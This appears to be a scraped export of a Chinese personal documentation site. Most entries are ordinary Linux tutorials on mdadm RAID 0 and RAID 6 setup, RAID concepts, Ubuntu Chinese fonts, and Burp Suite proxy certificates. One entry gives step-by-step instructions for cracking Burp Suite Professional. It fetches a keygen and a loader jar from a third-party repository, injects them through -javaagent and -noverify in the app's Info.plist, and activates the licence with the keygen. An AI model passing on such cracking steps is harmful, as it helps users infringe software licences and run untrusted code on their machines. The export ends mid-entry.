(条带化双分布式奇偶校验)","text":"参考:: 作者: Babin Lonston 译者: LCTT 译者: struggling < https://linux.cn/portal.php?mod=comment&id=6121&idtype=aid >`_ RAID 6 是 RAID 5 的升级版，它有两个分布式奇偶校验，即使两个磁盘发生故障后依然有容错能力。 在两个磁盘同时发生故障时，系统的关键任务仍然能运行。 它与 RAID 5 相似，但性能更健壮，因为它多用了一个磁盘来进行奇偶校验。 在之前的文章中，我们已经在 RAID 5 看了分布式奇偶校验，但在本文中，我们将看到的是 RAID 6 双分布式奇偶校验。 不要期望比其他 RAID 有更好的性能，除非你也安装了一个专用的 RAID 控制器。 在 RAID 6 中，即使我们失去了2个磁盘，我们仍可以通过更换磁盘，从校验中构建数据，然后取回数据。 在 Linux 中安装 RAID 6 要建立一个 RAID 6，一组最少需要4个磁盘。RAID 6 甚至在有些组中会有更多磁盘， 这样将多个硬盘捆在一起，当读取数据时，它会同时从所有磁盘读取， 所以读取速度会更快，当写数据时，因为它要将数据写在条带化的多个磁盘上，所以性能会较差。 现在，很多人都在讨论为什么我们需要使用 RAID 6，它的性能和其他 RAID 相比并不太好。 提出这个问题首先需要知道的是，如果需要高容错性就选择 RAID 6。 在每一个用于数据库的高可用性要求较高的环境中， 他们需要 RAID 6 因为数据库是最重要，无论花费多少都需要保护其安全，它在视频流环境中也是非常有用的。 RAID 6 的的优点和缺点 性能不错。 RAID 6 比较昂贵，因为它要求两个独立的磁盘用于奇偶校验功能。 将失去两个磁盘的容量来保存奇偶校验信息（双奇偶校验）。 即使两个磁盘损坏，数据也不会丢失。我们可以在更换损坏的磁盘后从校验中重建数据。 读性能比 RAID 5 更好，因为它从多个磁盘读取，但对于没有专用的 RAID 控制器的设备写性能将非常差。 要求 要创建一个 RAID 6 最少需要4个磁盘。 你也可以添加更多的磁盘，但你必须有专用的 RAID 控制器。 使用软件 RAID 我们在 RAID 6 中不会得到更好的性能，所以我们需要一个物理 RAID 控制器。 如果你新接触 RAID 设置，我们建议先看完以下 RAID 文章。 原文: 介绍 RAID 的级别和概念 使用 mdadm 工具创建软件 RAID 0 （条带化） 用两块磁盘创建 RAID 1（镜像） 创建 RAID 5（条带化与分布式奇偶校验） 我的服务器设置: 操作系统 : CentOS 6.5 Final IP 地址 : 192.168.0.228 主机名 : rd6.tecmintlocal.com 磁盘 1 [20GB] : /dev/sdb 磁盘 2 [20GB] : /dev/sdc 磁盘 3 [20GB] : /dev/sdd 磁盘 4 [20GB] : /dev/sde 这是9篇系列教程的第5部分， 在这里我们将看到如何在 Linux 系统或者服务器上使用四个 20GB 的磁盘（名为 /dev/sdb、 /dev/sdc、 /dev/sdd 和 /dev/sde） 创建和设置软件 RAID 6 （条带化双分布式奇偶校验）。 第1步：安装 mdadm 工具，并检查磁盘 如果你按照我们最进的两篇 RAID 文章（第2篇和第3篇），我们已经展示了如何安装 mdadm 工具。 如果你直接看的这篇文章，我们先来解释下在 Linux 系统中如何使用 mdadm 工具来创建和管理 RAID， 首先根据你的 Linux 发行版使用以下命令来安装: yum install mdadm # [在 RedHat 系统] apt-get install mdadm # [在 Debain 系统] 安装该工具后，然后来验证所需的四个磁盘，我们将会使用下面的 fdisk 命令来检查用于创建 RAID 的磁盘: fdisk -l | grep sd 在 Linux 中检查磁盘 在创建 RAID 磁盘前，先检查下我们的磁盘是否创建过 RAID 分区: mdadm -E /dev/sd[b-e]### mdadm --examine /dev/sdb /dev/sdc /dev/sdd /dev/sde ### 或 在磁盘上检查 RAID 分区 注解 在上面的图片中，没有检测到任何 super-block 或者说在四个磁盘上没有 RAID 存在。现在我们开始创建 RAID 6。 第2步：为 RAID 6 创建磁盘分区 现在在 /dev/sdb , /dev/sdc , /dev/sdd 和 /dev/sde 上为 RAID 创建分区， 使用下面的 fdisk 命令。在这里，我们将展示如何在 sdb 磁盘创建分区，同样的步骤也适用于其他分区。 创建 /dev/sdb 分区: fdisk /dev/sdb 请按照说明进行操作，如下图所示创建分区。 按 n 创建新的分区。 然后按 P 选择主分区。 接下来选择分区号为1。 只需按两次回车键选择默认值即可。 然后，按 P 来打印创建好的分区。 按 L ，列出所有可用的类型。 按 t 去修改分区。 键入 fd 设置为 Linux 的 RAID 类型，然后按回车确认。 然后再次使用 p 查看我们所做的更改。 使用 w 保存更改。 创建 /dev/sdb 分区* 创建 /dev/sdc 分区: fdisk /dev/sdc 创建 /dev/sdc 分区 创建 /dev/sdd 分区: fdisk /dev/sdd 创建 /dev/sdd 分区 创建 /dev/sde 分区: fdisk /dev/sde 创建 /dev/sde 分区 创建好分区后，检查磁盘的 super-blocks 是个好的习惯。 如果 super-blocks 不存在我们可以按前面的创建一个新的 RAID: mdadm -E /dev/sd[b-e]1 ### mdadm --examine /dev/sdb1 /dev/sdc1 /dev/sdd1 /dev/sde1 ### 或 Check Raid on New Partitions, 在新分区中检查 RAID 第3步：创建 md 设备（RAID） 现在可以使用以下命令创建 RAID 设备 md0 （即 /dev/md0）， 并在所有新创建的分区中应用 RAID 级别，然后确认 RAID 设置: mdadm --create /dev/md0 --level=6 --raid-devices=4 /dev/sdb1 /dev/sdc1 /dev/sdd1 /dev/sde1 cat /proc/mdstat 创建 Raid 6 设备 你还可以使用 watch 命令来查看当前创建 RAID 的进程，如下图所示: watch -n1 cat /proc/mdstat 检查 RAID 6 创建过程 使用以下命令验证 RAID 设备: mdadm -E /dev/sd[b-e]1 注解 上述命令将显示四个磁盘的信息，这是相当长的，所以没有截取其完整的输出。 接下来，验证 RAID 阵列，以确认重新同步过程已经开始: mdadm --detail /dev/md0 检查 Raid 6 阵列 第4步：在 RAID 设备上创建文件系统 使用 ext4 为 /dev/md0 创建一个文件系统，并将它挂载在 /mnt/raid6 。 这里我们使用的是 ext4，但你可以根据你的选择使用任意类型的文件系统: mkfs.ext4 /dev/md0 在 RAID 6 上创建文件系统 将创建的文件系统挂载到 /mnt/raid6，并验证挂载点下的文件，我们可以看到 lost+found 目录: mkdir /mnt/raid6### mount /dev/md0 /mnt/raid6/### ls -l /mnt/raid6/ 在挂载点下创建一些文件，在任意文件中添加一些文字并验证其内容: touch /mnt/raid6/raid6_test.txt ls -l /mnt/raid6/ echo \"tecmint raid setups\" > /mnt/raid6/raid6_test.txt cat /mnt/raid6/raid6_test.txt 验证 RAID 内容 在 /etc/fstab 中添加以下条目使系统启动时自动挂载设备，操作系统环境不同挂载点可能会有所不同: vim /etc/fstab/dev/md0 /mnt/raid6 ext4 defaults 0 0 自动挂载 RAID 6 设备 接下来，执行 mount -a 命令来验证 fstab 中的条目是否有错误: mount -av 验证 RAID 是否自动挂载 第5步：保存 RAID 6 的配置 请注意，默认情况下 RAID 没有配置文件。 我们需要使用以下命令手动保存它，然后检查设备 /dev/md0 的状态: mdadm --detail --scan --verbose >> /etc/mdadm.conf cat /etc/mdadm.conf mdadm --detail /dev/md0 保存 RAID 6 配置 检查 RAID 6 状态 第6步：添加备用磁盘 现在，已经使用了4个磁盘，并且其中两个作为奇偶校验信息来使用。 在某些情况下，如果任意一个磁盘出现故障，我们仍可以得到数据，因为在 RAID 6 使用双奇偶校验。 如果第二个磁盘也出现故障，在第三块磁盘损坏前我们可以添加一个新的。 可以在创建 RAID 集时加入一个备用磁盘，但我在创建 RAID 集合前没有定义备用的磁盘。 不过，我们可以在磁盘损坏后或者创建 RAID 集合时添加一块备用磁盘。 现在，我们已经创建好了 RAID，下面让我演示如何添加备用磁盘。 为了达到演示的目的，我已经热插入了一个新的 HDD 磁盘（即 /dev/sdf），让我们来验证接入的磁盘: ls -l /dev/ | grep sd 检查新磁盘 现在再次确认新连接的磁盘没有配置过 RAID ，使用 mdadm 来检查: mdadm --examine /dev/sdf 在新磁盘中检查 RAID 像往常一样，我们早前已经为四个磁盘创建了分区，同样，我们使用 fdisk 命令为新插入的磁盘创建新分区: fdisk /dev/sdf 为 /dev/sdf 创建分区 在 /dev/sdf 创建新的分区后，在新分区上确认没有 RAID， 然后将备用磁盘添加到 RAID 设备 /dev/md0 中，并验证添加的设备: mdadm --examine /dev/sdf mdadm --examine /dev/sdf1 mdadm --add /dev/md0 /dev/sdf1 mdadm --detail /dev/md0 在 sdf 分区上验证 Raid Add sdf Partition to Raid, 添加 sdf 分区到 RAID 验证 sdf 分区信息 第7步：检查 RAID 6 容错 现在，让我们检查备用驱动器是否能自动工作，当我们阵列中的任何一个磁盘出现故障时。 为了测试，我将一个磁盘手工标记为故障设备。 在这里，我们标记 /dev/sdd1 为故障磁盘: mdadm --manage --fail /dev/md0 /dev/sdd1 检查 RAID 6 容错 让我们查看 RAID 的详细信息，并检查备用磁盘是否开始同步: mdadm --detail /dev/md0 检查 RAID 自动同步 这里，我们看到备用磁盘激活了，并开始重建进程。 在底部，我们可以看到有故障的磁盘 /dev/sdd1 标记为 faulty。可以使用下面的命令查看进程重建: cat /proc/mdstat RAID 6 自动同步","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Install-RAID-6-(strip--based-dual-distributed-puppet-verification).html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Install-RAID-6-(strip--based-dual-distributed-puppet-verification).html"},{"title":"RAID 的级别和概念","text":"参考:: 作者: Babin Lonston 译者: LCTT 译者: struggling 评论: https://linux.cn/portal.php?mod=comment&id=6085&idtype=aid RAID 的意思是廉价磁盘冗余阵列（Redundant Array of Inexpensive Disks）， 但现在它被称为独立磁盘冗余阵列（Redundant Array of Independent Drives）。 早先一个容量很小的磁盘都是非常昂贵的，但是现在我们可以很便宜的买到一个更大的磁盘。 Raid 是一系列放在一起，成为一个逻辑卷的磁盘集合。 在 Linux 中理解 RAID 设置 RAID 包含一组或者一个集合甚至一个阵列。 使用一组磁盘结合驱动器组成 RAID 阵列或 RAID 集。 将至少两个磁盘连接到一个 RAID 控制器，而成为一个逻辑卷，也可以将多个驱动器放在一个组中。 一组磁盘只能使用一个 RAID 级别。 使用 RAID 可以提高服务器的性能。 不同 RAID 的级别，性能会有所不同。它通过容错和高可用性来保存我们的数据。 这个系列被命名为\"在 Linux 下使用 RAID\"，分为9个部分，包括以下主题： 第1部分: 介绍 RAID 的级别和概念 第2部分: 在Linux中如何设置 RAID0（条带化） 第3部分: 在Linux中如何设置 RAID1（镜像化） 第4部分: 在Linux中如何设置 RAID5（条带化与分布式奇偶校验） 第5部分: 在Linux中如何设置 RAID6（条带双分布式奇偶校验） 第6部分: 在Linux中设置 RAID 10 或1 + 0（嵌套） 第7部分: 扩展现有的 RAID 阵列和删除故障的磁盘 第8部分: 在 RAID 中恢复（重建）损坏的驱动器 第9部分: 在 Linux 中管理 RAID 这是9篇系列教程的第1部分，在这里我们将介绍 RAID 的概念和 RAID 级别，这是在 Linux 中构建 RAID 需要理解的。 软件 RAID 和硬件 RAID 软件 RAID 的性能较低 因为其使用主机的资源。 需要加载 RAID 软件以从软件 RAID 卷中读取数据。 在加载 RAID 软件前，操作系统需要引导起来才能加载 RAID 软件。 在软件 RAID 中无需物理硬件。零成本投资。 硬件 RAID 的性能较高 他们采用 PCI Express 卡物理地提供有专用的 RAID 控制器。 它不会使用主机资源。 他们有 NVRAM 用于缓存的读取和写入。 缓存用于 RAID 重建时，即使出现电源故障，它会使用后备的电池电源保持缓存。 对于大规模使用是非常昂贵的投资。 重要的 RAID 概念 校验 方式用在 RAID 重建中从校验所保存的信息中重新生成丢失的内容。 RAID 5，RAID 6 基于校验。 条带化 是将切片数据随机存储到多个磁盘。它不会在单个磁盘中保存完整的数据。如果我们使用2个磁盘，则每个磁盘存储我们的一半数据。 镜像 被用于 RAID 1 和 RAID 10。镜像会自动备份数据。在 RAID 1 中，它会保存相同的内容到其他盘上。 热备份 只是我们的服务器上的一个备用驱动器，它可以自动更换发生故障的驱动器。在我们的阵列中，如果任何一个驱动器损坏，热备份驱动器会自动用于重建 RAID。 块 是 RAID 控制器每次读写数据时的最小单位，最小 4KB。通过定义块大小，我们可以增加 I/O 性能。 RAID有不同的级别。在这里，我们仅列出在真实环境下的使用最多的 RAID 级别。 RAID0 = 条带化 RAID1 = 镜像 RAID5 = 单磁盘分布式奇偶校验 RAID6 = 双磁盘分布式奇偶校验 RAID10 = 镜像 + 条带。（嵌套RAID） RAID 在大多数 Linux 发行版上使用名为 mdadm 的软件包进行管理。让我们先对每个 RAID 级别认识一下。 RAID 0 / 条带化 条带化有很好的性能。 在 RAID 0（条带化）中数据将使用切片的方式被写入到磁盘。 一半的内容放在一个磁盘上，另一半内容将被写入到另一个磁盘。 假设我们有2个磁盘驱动器， 例如，如果我们将数据\"TECMINT\"写到逻辑卷中， \"T\"将被保存在第一盘中，\"E\"将保存在第二盘， 'C'将被保存在第一盘，\"M\"将保存在第二盘，它会一直继续此循环过程。 （LCTT 译注：实际上不可能按字节切片，是按数据块切片的。） 在这种情况下，如果驱动器中的任何一个发生故障，我们就会丢失数据， 因为一个盘中只有一半的数据，不能用于重建 RAID。 不过，当比较写入速度和性能时，RAID 0 是非常好的。 创建 RAID 0（条带化）至少需要2个磁盘。如果你的数据是非常宝贵的，那么不要使用此 RAID 级别。 高性能。 RAID 0 中容量零损失。 零容错。 写和读有很高的性能。 RAID 1 / 镜像化 镜像也有不错的性能。 镜像可以对我们的数据做一份相同的副本。假设我们有两个2TB的硬盘驱动器，我们总共有4TB， 但在镜像中，但是放在 RAID 控制器后面的驱动器形成了一个逻辑驱动器，我们只能看到这个逻辑驱动器有2TB。 当我们保存数据时，它将同时写入这两个2TB驱动器中。 创建 RAID 1（镜像化）最少需要两个驱动器。 如果发生磁盘故障，我们可以通过更换一个新的磁盘恢复 RAID 。 如果在 RAID 1 中任何一个磁盘发生故障， 我们可以从另一个磁盘中获取相同的数据，因为另外的磁盘中也有相同的数据。所以是零数据丢失。 良好的性能。 总容量丢失一半可用空间。 完全容错。 重建会更快。 写性能变慢。 读性能变好。 能用于操作系统和小规模的数据库。 RAID 5 / 分布式奇偶校验 RAID 5 多用于企业级。 RAID 5 的以分布式奇偶校验的方式工作。 奇偶校验信息将被用于重建数据。 它从剩下的正常驱动器上的信息来重建。在驱动器发生故障时，这可以保护我们的数据。 假设我们有4个驱动器，如果一个驱动器发生故障而后我们更换发生故障的驱动器后， 我们可以从奇偶校验中重建数据到更换的驱动器上。 奇偶校验信息存储在所有的4个驱动器上，如果我们有4个 1TB 的驱动器。 奇偶校验信息将被存储在每个驱动器的256G中，而其它768GB是用户自己使用的。 单个驱动器故障后，RAID 5 依旧正常工作，如果驱动器损坏个数超过1个会导致数据的丢失。 性能卓越 读速度将非常好。 写速度处于平均水准，如果我们不使用硬件 RAID 控制器，写速度缓慢。 从所有驱动器的奇偶校验信息中重建。 完全容错。 1个磁盘空间将用于奇偶校验。 可以被用在文件服务器，Web服务器，非常重要的备份中。 RAID 6 双分布式奇偶校验磁盘 RAID 6 和 RAID 5 相似但它有两个分布式奇偶校验。 大多用在大数量的阵列中。 我们最少需要4个驱动器，即使有2个驱动器发生故障，我们依然可以更换新的驱动器后重建数据。 它比 RAID 5 慢，因为它将数据同时写到4个驱动器上。 当我们使用硬件 RAID 控制器时速度就处于平均水准。 如果我们有6个的1TB驱动器，4个驱动器将用于数据保存，2个驱动器将用于校验。 性能不佳。 读的性能很好。 如果我们不使用硬件 RAID 控制器写的性能会很差。 从两个奇偶校验驱动器上重建。 完全容错。 2个磁盘空间将用于奇偶校验。 可用于大型阵列。 用于备份和视频流中，用于大规模。 RAID 10 / 镜像+条带 RAID 10 可以被称为1 + 0或0 +1。它将做镜像+条带两个工作。 在 RAID 10 中首先做镜像然后做条带。在 RAID 01 上首先做条带，然后做镜像。RAID 10 比 01 好。 假设，我们有4个驱动器。当我逻辑卷上写数据时，它会使用镜像和条带的方式将数据保存到4个驱动器上。 如果我在 RAID 10 上写入数据\"TECMINT\"，数据将使用如下方式保存。 首先将\"T\"同时写入两个磁盘，\"E\"也将同时写入另外两个磁盘， 所有数据都写入两块磁盘。这样可以将每个数据复制到另外的磁盘。 同时它将使用 RAID 0 方式写入数据， 遵循将\"T\"写入第一组盘，\"E\"写入第二组盘。再次将\"C\"写入第一组盘，\"M\"到第二组盘。 良好的读写性能。 总容量丢失一半的可用空间。 容错。 从副本数据中快速重建。 由于其高性能和高可用性，常被用于数据库的存储中。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-RAID-level-and-concept.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-RAID-level-and-concept.html"},{"title":"使用 mdadm 工具创建软件 RAID 0 (条带化)","text":"参考:: 作者: <Babin Lonston 译者: LCTT 译者: struggling < https://linux.cn/portal.php?mod=comment&id=6087&idtype=aid >`_ RAID 即廉价磁盘冗余阵列，其高可用性和可靠性适用于大规模环境中，相比正常使用，数据更需要被保护。 RAID 是一些磁盘的集合，是包含一个阵列的逻辑卷。驱动器可以组合起来成为一个阵列或称为（组的）集合。 创建 RAID 最少应使用2个连接到 RAID 控制器的磁盘组成，来构成逻辑卷， 可以根据定义的 RAID 级别将更多的驱动器添加到一个阵列中。 不使用物理硬件创建的 RAID 被称为软件 RAID。软件 RAID 也叫做穷人 RAID。 使用 RAID 的主要目的是为了在发生单点故障时保存数据， 如果我们使用单个磁盘来存储数据，如果它损坏了， 那么就没有机会取回我们的数据了， 为了防止数据丢失我们需要一个容错的方法。 所以，我们可以使用多个磁盘组成 RAID 阵列。 在 RAID 0 中条带是什么 条带是通过将数据在同时分割到多个磁盘上。 假设我们有两个磁盘，如果我们将数据保存到该逻辑卷上，它会将数据保存在两个磁盘上。 使用 RAID 0 是为了获得更好的性能，但是如果驱动器中一个出现故障，我们将不能得到完整的数据。 因此，使用 RAID 0 不是一种好的做法。唯一的解决办法就是安装有 RAID 0 逻辑卷的操作系统来提高重要文件的安全性。 RAID 0 性能较高。 在 RAID 0 上，空间零浪费。 零容错（如果硬盘中的任何一个发生故障，无法取回数据）。 写和读性能都很好。 要求 创建 RAID 0 允许的最小磁盘数目是2个，但你可以添加更多的磁盘， 不过数目应该是2，4，6，8等的偶数。 如果你有一个物理 RAID 卡并且有足够的端口，你可以添加更多磁盘。 在这里，我们没有使用硬件 RAID，此设置只需要软件 RAID。 如果我们有一个物理硬件 RAID 卡，我们可以从它的功能界面访问它。 有些主板默认内建 RAID 功能，还可以使用 Ctrl + I 键访问它的界面。 关于 RAID 基本的概念: RAID 的级别和概念 我的服务器设置: - 操作系统 : CentOS 6.5 FinalIP - 地址 : 192.168.0.225 - 两块盘 : 20 GB each 这是9篇系列教程的第2部分，在这部分，我们将看看如何能够在 Linux 上创建和使用 RAID 0（条带化），以名为 sdb 和 sdc 两个 20GB 的硬盘为例。 第1步：更新系统和安装管理 RAID 的 mdadm 软件 在 Linux 上设置 RAID 0 前，我们先更新一下系统，然后安装 mdadm 包。 mdadm 是一个小程序，这将使我们能够在Linux下配置和管理 RAID 设备: yum clean all && yum update### yum install mdadm -y 第2步：确认连接了两个 20GB 的硬盘 在创建 RAID 0 前，请务必确认两个硬盘能被检测到，使用下面的命令确认: ls -l /dev | grep sd 一旦检测到新的硬盘驱动器， 同时检查是否连接的驱动器已经被现有的 RAID 使用，使用下面的 mdadm 命令来查看: mdadm --examine /dev/sd[b-c] 第3步：创建 RAID 分区 现在用 sdb 和 sdc 创建 RAID 的分区，使用 fdisk 命令来创建。 在这里，我将展示如何创建 sdb 驱动器上的分区: fdisk /dev/sdb 请按照以下说明创建分区。 按 n 创建新的分区。 然后按 P 选择主分区。 接下来选择分区号为1。 只需按两次回车键选择默认值即可。 然后，按 P 来显示创建好的分区。 请按照以下说明将分区创建为 Linux 的 RAID 类型。 按 L ，列出所有可用的类型。 按 t 去修改分区。 键入 fd 设置为 Linux 的 RAID 类型，然后按回车确认。 然后再次使用 p 查看我们所做的更改。 使用 w 保存更改。 注解 请使用上述步骤同样在 sdc 驱动器上创建分区。 创建分区后，验证这两个驱动器是否正确定义 RAID，使用下面的命令: mdadm --examine /dev/sd[b-c]### mdadm --examine /dev/sd[b-c]1 第4步：创建 RAID md 设备 现在使用以下命令创建 md 设备（即 /dev/md0），并选择 RAID 合适的级别: mdadm -C /dev/md0 -l raid0 -n 2 /dev/sd[b-c]1### mdadm --create /dev/md0 --level=stripe --raid-devices=2 /dev/sd[b-c]1 -C – 创建 -l – 级别 -n – RAID 设备数 一旦 md 设备已经建立，使用如下命令可以查看 RAID 级别，设备和阵列的使用状态: cat /proc/mdstat 查看 RAID 级别: mdadm -E /dev/sd[b-c]1 查看 RAID 设备: mdadm --detail /dev/md0 查看 RAID 阵列 第5步：给 RAID 设备创建文件系统 将 RAID 设备 /dev/md0 创建为 ext4 文件系统，并挂载到 /mnt/raid0 下: mkfs.ext4 /dev/md0 在 RAID 设备上创建好 ext4 文件系统后，现在创建一个挂载点（即 /mnt/raid0），并将设备 /dev/md0 挂载在它下: mkdir /mnt/raid0### mount /dev/md0 /mnt/raid0/ 下一步，使用 df 命令验证设备 /dev/md0 是否被挂载在 /mnt/raid0 下: df -h 接下来，在挂载点 /mnt/raid0 下创建一个名为 tecmint.txt 的文件， 为创建的文件添加一些内容，并查看文件和目录的内容: touch /mnt/raid0/tecmint.txt echo \"Hi everyone how you doing ?\" > /mnt/raid0/tecmint.txt cat /mnt/raid0/tecmint.txt ls -l /mnt/raid0/ 当你验证挂载点后，就可以将它添加到 /etc/fstab 文件中( 添加设备到 fstab 文件中 ): vim /etc/fstab 添加以下条目，根据你的安装位置和使用文件系统的不同，自行做修改: /dev/md0 /mnt/raid0 ext4 deaults 0 0 使用 mount 命令的 -a 来检查 fstab 的条目是否有误: mount -av 第6步：保存 RAID 配置 最后，保存 RAID 配置到一个文件中，以供将来使用。 我们再次使用带有 -s (scan) 和 -v (verbose) 选项的 mdadm mdadm -E -s -v >> /etc/mdadm.conf### mdadm --detail --scan --verbose >> /etc/mdadm.conf ### cat /etc/mdadm.conf 就这样，我们在这里看到，如何通过使用两个硬盘配置具有条带化的 RAID 0 。在接下来的文章中，我们将看到如何设置 RAID 1。 最新评论: - 来自北京的 Chrome 43.0|Windows 7 用户 2015-12-02 12:46.4 赞 `<https://linux.cn/portal.php?mod=review&action=postreview&do=support&idtype=aid&tid=6087&pid=36536&hash=5522402f>`_ `回复 <https://linux.cn/portal.php?mod=portalcp&ac=comment&op=reply&cid=36536&aid=6087&idtype=>`_ 这年头还搞软raid，让硬件生产商如何生活 - `XYJK1002 [Chrome 42.0|Windows 7\\] <https://linux.cn/space/20893/>`_ 2015-10-03 19:139 赞 `<https://linux.cn/portal.php?mod=review&action=postreview&do=support&idtype=aid&tid=6087&pid=35399&hash=5522402f>`_ `回复 <https://linux.cn/portal.php?mod=portalcp&ac=comment&op=reply&cid=35399&aid=6087&idtype=>`_ 讨论的这么激烈。。。 - `linux [Chrome 44.0|Mac 10.10\\] <https://linux.cn/space/1/>`_ 2015-08-28 09:013 赞 `<https://linux.cn/portal.php?mod=review&action=postreview&do=support&idtype=aid&tid=6087&pid=34761&hash=5522402f>`_ `回复 <https://linux.cn/portal.php?mod=portalcp&ac=comment&op=reply&cid=34761&aid=6087&idtype=>`_ 系统崩溃时，输出的数据没准都是错误的，硬件 RAID 卡也无法防范这点。只是避免了在 IO 系统将数据送到 RAID 卡后的错误。 - 来自云南昆明的 Chrome 41.0|Windows 7 用户 2015-08-26 11:274 赞 `<https://linux.cn/portal.php?mod=review&action=postreview&do=support&idtype=aid&tid=6087&pid=34719&hash=5522402f>`_ `回复 <https://linux.cn/portal.php?mod=portalcp&ac=comment&op=reply&cid=34719&aid=6087&idtype=>`_ 以前建 RAID5 时，重启后 /dev/md0 名字就变了，也不知道怎么改回来，后面才知道是 /etc/mdadm.conf 的问题","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Use-the-MDADM-tool-to-create-software-RAID-0-(strip--cation).html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Use-the-MDADM-tool-to-create-software-RAID-0-(strip--cation).html"},{"title":"ssh重置计数器","text":"这里是指, 登陆失败时, ssh会统计次数, 超过时, 会等待一段时间才可以再次继续. 可以使用 PAM_RESET_USER 来重置这个计数器, 以立刻继续使用","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-question-SSH-reset-counter.html","loc":"/yq-doc-source-docs-operating-system-linux-question-SSH-reset-counter.html"},{"title":"ubuntu中文支持","text":"方式一: 图形化设置 在 Settings 下找到 Region&Language, 进入后点击 Manage Install Languages, 在 其中选择汉语即可. 这里若缺少包后会提示缺少相关语言包, 输入密码下载即可. 方式二: 命令行设置 安装中文包: apt update apt install language-pack-zh-hans 设置区域为中文: localectl set-locale LANG=zh_CN.utf8 然后重启: reboot 可以查看当前设置的区域语言: locale 其他指令 查看语言支持的字体: check-language-support 然后都可以装上(如果没装, 可能会存在乱码问题), 一般应该是这些: sudo apt install fonts-droid-fallback ttf-wqy-zenhei ttf-wqy-microhei fonts-arphic-ukai fonts-arphic-uming 安装等宽字体, 有一个比较好的等宽字体叫Inconsolata, 在ubuntu中可安装: sudo apt install fonts-inconsolata 若不是这名, 可以搜索一下: apt search inconsolata 设置为指定的字体 Ubuntu字体及配置说明: https://wiki.ubuntu.org.cn/字体#.E9.85.8D.E7.BD.AE.fonts.conf 新建文件 ~/.config/fontconfig/fonts.conf : <?xml version=\"1.0\"?> <!DOCTYPE fontconfig SYSTEM \"/etc/fonts/conf.d/fonts.dtd\"> <fontconfig> <match target=\"pattern\"> <test qual=\"any\" name=\"family\"> <string>monospace</string> </test> <edit name=\"family\" mode=\"prepend\" binding=\"strong\"> <string>inconsolata</string> </edit> </match> <match target=\"pattern\"> <test qual=\"any\" name=\"family\"> <string>sans-serif</string> </test> <edit name=\"family\" mode=\"prepend\" binding=\"strong\"> <string>inconsolata</string> </edit> </match> </fontconfig> 表示把 monospace 等宽字体和, sans-serif 无衬线体(对中文而言指的就是黑体) 都优先设置为 inconsolata . 这个时候查看默认字体与等宽字体都改变了: ~$ fc-match Inconsolata.otf: \"Inconsolata\" \"Medium\" ~$ fc-match monospace Inconsolata.otf: \"Inconsolata\" \"Medium\" 具体参考: /docs/操作系统/linux/教程/debian-ubuntu字体说明","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-ubuntu-Ubuntu-Chinese-support.html","loc":"/yq-doc-source-docs-operating-system-linux-ubuntu-Ubuntu-Chinese-support.html"},{"title":"工具-burpsuite","text":"BurpSuite 安装 官网 下载官方包 下载注册机 - https://raw.githubusercontent.com/x-Ai/BurpSuite/main/BurpSuiteLoader.jar - https://raw.githubusercontent.com/x-Ai/BurpSuite/main/burp-keygen-scz.jar - 汉化文件 破解 打开安装包镜像后，将安装文件单独拉出来（拉出来才可以修改） 右键显示包内容 进入 Contents/Resources/app ， 将上述三个jar包复制进去 编辑 Contents/Info.plist 在 <string>-Dexe4j.moduleName=$APP_PACKAGE</string> 之后插入以下语句: <string>-noverify</string> <string>-javaagent:$APP_PACKAGE/Contents/Resources/app/BurpSuiteLoader.jar</string> 安装好后复制三个文件到 /Applications/Burp Suite Enterprise Edition/burp （有 burpsuite_pro_v2022.8.1.jar 的目录下） 安装成功后会在应用程序里有一个burp的文件夹，不同版本好像名称有差异 启动: cd /Applications/Burp Suite Enterprise Edition/burp; java -noverify -javaagent:BurpSuiteCnV2.0.jar -javaagent:BurpSuiteLoader.jar -Xmx2048m -jar burpsuite_pro_v2022.8.1.jar 此时会有提示激活的图形化界面， 打开 burp-keygen-scz.jar 注册机，来做相应的激活 burpsuite使用证书 搭建burpsuite服务时，可选使用证书 环境/工具 MacOS 12.5 openssl 步骤, 部分可参考 /docs/安全/生成TLS(SSL)证书 : # 生成rsa私钥，des3算法，1024位强度，ssl.key是秘钥文件名。 openssl genrsa -des3 -out ssl.key 1024 # 根据提示输入密码。当前文件夹下生成一个 ssl.key 文件。 # 删除密码。 # 这里目录和生成私钥的目录一致 openssl rsa -in ssl.key -out ssl.key # 生成 CSR（证书签名请求）。根据根据刚刚生成的 key 文件来生成证书请求文件 openssl req -new -key ssl.key -out ssl.csr # 依次输入国家、地区、城市、组织、组织单位、Common Name、Email 和密码。其中 Common Name 应该与域名保持一致。密码我们已经删掉了,直接回车即可。 # 提示：Common Name 就是证书对应的域名地址，我们开发微信小程序时必须要让我们的外链的 https 的域名和证书统一才行。 # 生成自签名证书。根据以上 2 个文件生成 crt 证书文件，终端执行下面命令： # 这里3650是证书有效期(单位：天)。这个大家随意。最后使用到的文件是key和crt文件。 openssl x509 -req -days 3650 -in ssl.csr -signkey ssl.key -out ssl.crt # 到这里我们的证书(ssl.key 和 ssl.crt) 就已经创建成功了可以直接用到 https 的 server 中了。 # 在代码中使用证书： https .createServer( { key: fs.readFileSync(\"./cert_key/ssl.key\"), cert: fs.readFileSync(\"./cert_key/ssl.crt\") }, app ) .listen(1993);","tags":"安全","url":"/yq-doc-source-docs-Safety-brup-Tool-Burpsuite.html","loc":"/yq-doc-source-docs-Safety-brup-Tool-Burpsuite.html"},{"title":"macos使用brup","text":"安装过程暂不表述, 主要是已经忘了 证书配置 系统: macOS 13 打开burp设置代理地址 设置地址: 127.0.0.1:9998 设置浏览器代理地址 进入路径为 系统设置 -> wifi -> 详细信息 -> 网页代理 或者打开safari -> 偏好设置 -> 高级 -> 代理 http和https都可以设置好 浏览器打开该地址下载证书 点击右上角下载证书(可以重命名) 导入证书 comman + space 打开搜索, 找到 钥匙串访问 并打开, 进入 登录 -> 证书 进入 登录 -> 证书 将下载好的证书拖动到此页面, 并设置为始终信任(选中右键 -> 显示简介 -> 始终信任) 之后就可以在burp进行拦截了.","tags":"安全","url":"/yq-doc-source-docs-Safety-brup-macos-uses-brup.html","loc":"/yq-doc-source-docs-Safety-brup-macos-uses-brup.html"},{"title":"Kali安装、配置","text":"下载地址 